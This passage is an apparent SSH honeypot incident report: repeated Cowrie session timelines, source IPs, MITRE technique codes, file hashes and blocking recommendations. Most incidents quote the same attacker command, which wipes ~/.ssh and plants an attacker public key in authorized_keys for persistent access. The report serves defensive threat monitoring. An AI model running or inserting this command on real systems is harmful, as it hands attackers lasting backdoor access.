| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:25:34` | `cowrie.session.connect` |
| `2026-06-07 12:25:34` | `cowrie.client.version` |
| `2026-06-07 12:25:34` | `cowrie.client.kex` |
| `2026-06-07 12:25:34` | `cowrie.login.success` |
| `2026-06-07 12:25:34` | `cowrie.session.params` |
| `2026-06-07 12:25:34` | `cowrie.command.input` |
| `2026-06-07 12:25:34` | `cowrie.command.failed` |
| `2026-06-07 12:25:35` | `cowrie.log.closed` |
| `2026-06-07 12:25:35` | `cowrie.session.params` |
| `2026-06-07 12:25:35` | `cowrie.command.input` |
| `2026-06-07 12:25:35` | `cowrie.session.file_download` |
| `2026-06-07 12:25:35` | `cowrie.log.closed` |
| `2026-06-07 12:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd71db89f448

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:25 |
| **Last Seen** | 2026-06-07 12:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:25:37` | `cowrie.session.connect` |
| `2026-06-07 12:25:37` | `cowrie.client.version` |
| `2026-06-07 12:25:37` | `cowrie.client.kex` |
| `2026-06-07 12:25:37` | `cowrie.login.success` |
| `2026-06-07 12:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27b0999331bc

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:29 |
| **Last Seen** | 2026-06-07 12:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:29:42` | `cowrie.session.connect` |
| `2026-06-07 12:29:42` | `cowrie.client.version` |
| `2026-06-07 12:29:42` | `cowrie.client.kex` |
| `2026-06-07 12:29:42` | `cowrie.login.success` |
| `2026-06-07 12:29:42` | `cowrie.session.params` |
| `2026-06-07 12:29:42` | `cowrie.command.input` |
| `2026-06-07 12:29:42` | `cowrie.command.failed` |
| `2026-06-07 12:29:42` | `cowrie.log.closed` |
| `2026-06-07 12:29:42` | `cowrie.session.params` |
| `2026-06-07 12:29:42` | `cowrie.command.input` |
| `2026-06-07 12:29:42` | `cowrie.session.file_download` |
| `2026-06-07 12:29:42` | `cowrie.log.closed` |
| `2026-06-07 12:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1261a6c6413c

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:29 |
| **Last Seen** | 2026-06-07 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:29:44` | `cowrie.session.connect` |
| `2026-06-07 12:29:44` | `cowrie.client.version` |
| `2026-06-07 12:29:44` | `cowrie.client.kex` |
| `2026-06-07 12:29:44` | `cowrie.login.success` |
| `2026-06-07 12:29:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad37f1b69494

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:31 |
| **Last Seen** | 2026-06-07 12:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:31:38` | `cowrie.session.connect` |
| `2026-06-07 12:31:38` | `cowrie.client.version` |
| `2026-06-07 12:31:38` | `cowrie.client.kex` |
| `2026-06-07 12:31:38` | `cowrie.login.success` |
| `2026-06-07 12:31:38` | `cowrie.session.params` |
| `2026-06-07 12:31:38` | `cowrie.command.input` |
| `2026-06-07 12:31:38` | `cowrie.command.failed` |
| `2026-06-07 12:31:38` | `cowrie.log.closed` |
| `2026-06-07 12:31:38` | `cowrie.session.params` |
| `2026-06-07 12:31:38` | `cowrie.command.input` |
| `2026-06-07 12:31:39` | `cowrie.session.file_download` |
| `2026-06-07 12:31:39` | `cowrie.log.closed` |
| `2026-06-07 12:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b9010f9a39f

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:31 |
| **Last Seen** | 2026-06-07 12:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:31:40` | `cowrie.session.connect` |
| `2026-06-07 12:31:40` | `cowrie.client.version` |
| `2026-06-07 12:31:40` | `cowrie.client.kex` |
| `2026-06-07 12:31:40` | `cowrie.login.success` |
| `2026-06-07 12:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fbd0d433ff2

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:34 |
| **Last Seen** | 2026-06-07 12:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:34:56` | `cowrie.session.connect` |
| `2026-06-07 12:34:56` | `cowrie.client.version` |
| `2026-06-07 12:34:57` | `cowrie.client.kex` |
| `2026-06-07 12:34:58` | `cowrie.login.success` |
| `2026-06-07 12:34:59` | `cowrie.session.params` |
| `2026-06-07 12:34:59` | `cowrie.command.input` |
| `2026-06-07 12:34:59` | `cowrie.command.failed` |
| `2026-06-07 12:35:00` | `cowrie.log.closed` |
| `2026-06-07 12:35:01` | `cowrie.session.params` |
| `2026-06-07 12:35:01` | `cowrie.command.input` |
| `2026-06-07 12:35:01` | `cowrie.session.file_download` |
| `2026-06-07 12:35:01` | `cowrie.log.closed` |
| `2026-06-07 12:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08cc64a27e65

| Field | Detail |
|---|---|
| **Source IP** | `45.158.14[.]124` |
| **First Seen** | 2026-06-07 12:35 |
| **Last Seen** | 2026-06-07 12:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:35:03` | `cowrie.session.connect` |
| `2026-06-07 12:35:03` | `cowrie.client.version` |
| `2026-06-07 12:35:03` | `cowrie.client.kex` |
| `2026-06-07 12:35:04` | `cowrie.login.success` |
| `2026-06-07 12:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.158.14[.]124` to AbuseIPDB if not already reported
- [ ] Block `45.158.14[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35fde90c7477

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:42 |
| **Last Seen** | 2026-06-07 12:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:42:54` | `cowrie.session.connect` |
| `2026-06-07 12:42:54` | `cowrie.client.version` |
| `2026-06-07 12:42:54` | `cowrie.client.kex` |
| `2026-06-07 12:42:54` | `cowrie.login.success` |
| `2026-06-07 12:42:55` | `cowrie.session.params` |
| `2026-06-07 12:42:55` | `cowrie.command.input` |
| `2026-06-07 12:42:55` | `cowrie.command.failed` |
| `2026-06-07 12:42:55` | `cowrie.log.closed` |
| `2026-06-07 12:42:55` | `cowrie.session.params` |
| `2026-06-07 12:42:55` | `cowrie.command.input` |
| `2026-06-07 12:42:55` | `cowrie.session.file_download` |
| `2026-06-07 12:42:55` | `cowrie.log.closed` |
| `2026-06-07 12:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-144a366bfa71

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:42 |
| **Last Seen** | 2026-06-07 12:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:42:56` | `cowrie.session.connect` |
| `2026-06-07 12:42:56` | `cowrie.client.version` |
| `2026-06-07 12:42:57` | `cowrie.client.kex` |
| `2026-06-07 12:42:57` | `cowrie.login.success` |
| `2026-06-07 12:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a3fc56fa0eb

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:44 |
| **Last Seen** | 2026-06-07 12:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:44:46` | `cowrie.session.connect` |
| `2026-06-07 12:44:46` | `cowrie.client.version` |
| `2026-06-07 12:44:47` | `cowrie.client.kex` |
| `2026-06-07 12:44:47` | `cowrie.login.success` |
| `2026-06-07 12:44:47` | `cowrie.session.params` |
| `2026-06-07 12:44:47` | `cowrie.command.input` |
| `2026-06-07 12:44:47` | `cowrie.command.failed` |
| `2026-06-07 12:44:47` | `cowrie.log.closed` |
| `2026-06-07 12:44:47` | `cowrie.session.params` |
| `2026-06-07 12:44:47` | `cowrie.command.input` |
| `2026-06-07 12:44:47` | `cowrie.session.file_download` |
| `2026-06-07 12:44:47` | `cowrie.log.closed` |
| `2026-06-07 12:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c312cfe756e8

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:44 |
| **Last Seen** | 2026-06-07 12:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:44:49` | `cowrie.session.connect` |
| `2026-06-07 12:44:49` | `cowrie.client.version` |
| `2026-06-07 12:44:49` | `cowrie.client.kex` |
| `2026-06-07 12:44:49` | `cowrie.login.success` |
| `2026-06-07 12:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ced35e1e3ba

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:52 |
| **Last Seen** | 2026-06-07 12:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:52:32` | `cowrie.session.connect` |
| `2026-06-07 12:52:32` | `cowrie.client.version` |
| `2026-06-07 12:52:32` | `cowrie.client.kex` |
| `2026-06-07 12:52:32` | `cowrie.login.success` |
| `2026-06-07 12:52:33` | `cowrie.session.params` |
| `2026-06-07 12:52:33` | `cowrie.command.input` |
| `2026-06-07 12:52:33` | `cowrie.command.failed` |
| `2026-06-07 12:52:33` | `cowrie.log.closed` |
| `2026-06-07 12:52:33` | `cowrie.session.params` |
| `2026-06-07 12:52:33` | `cowrie.command.input` |
| `2026-06-07 12:52:33` | `cowrie.session.file_download` |
| `2026-06-07 12:52:33` | `cowrie.log.closed` |
| `2026-06-07 12:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b7f1c41ae3c

| Field | Detail |
|---|---|
| **Source IP** | `43.163.90[.]141` |
| **First Seen** | 2026-06-07 12:52 |
| **Last Seen** | 2026-06-07 12:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:52:34` | `cowrie.session.connect` |
| `2026-06-07 12:52:34` | `cowrie.client.version` |
| `2026-06-07 12:52:34` | `cowrie.client.kex` |
| `2026-06-07 12:52:35` | `cowrie.login.success` |
| `2026-06-07 12:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.90[.]141` to AbuseIPDB if not already reported
- [ ] Block `43.163.90[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12546b17244a

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:57 |
| **Last Seen** | 2026-06-07 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:57:23` | `cowrie.session.connect` |
| `2026-06-07 12:57:23` | `cowrie.client.version` |
| `2026-06-07 12:57:23` | `cowrie.client.kex` |
| `2026-06-07 12:57:23` | `cowrie.login.success` |
| `2026-06-07 12:57:24` | `cowrie.session.params` |
| `2026-06-07 12:57:24` | `cowrie.command.input` |
| `2026-06-07 12:57:24` | `cowrie.command.failed` |
| `2026-06-07 12:57:24` | `cowrie.log.closed` |
| `2026-06-07 12:57:24` | `cowrie.session.params` |
| `2026-06-07 12:57:24` | `cowrie.command.input` |
| `2026-06-07 12:57:24` | `cowrie.session.file_download` |
| `2026-06-07 12:57:24` | `cowrie.log.closed` |
| `2026-06-07 12:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe71869a2160

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:57 |
| **Last Seen** | 2026-06-07 12:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:57:25` | `cowrie.session.connect` |
| `2026-06-07 12:57:25` | `cowrie.client.version` |
| `2026-06-07 12:57:25` | `cowrie.client.kex` |
| `2026-06-07 12:57:25` | `cowrie.login.success` |
| `2026-06-07 12:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]237` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9559fdf622d

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-06-07 12:59 |
| **Last Seen** | 2026-06-07 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 12:59:41` | `cowrie.session.connect` |
| `2026-06-07 12:59:41` | `cowrie.client.version` |
| `2026-06-07 12:59:41` | `cowrie.client.kex` |
| `2026-06-07 12:59:41` | `cowrie.login.success` |
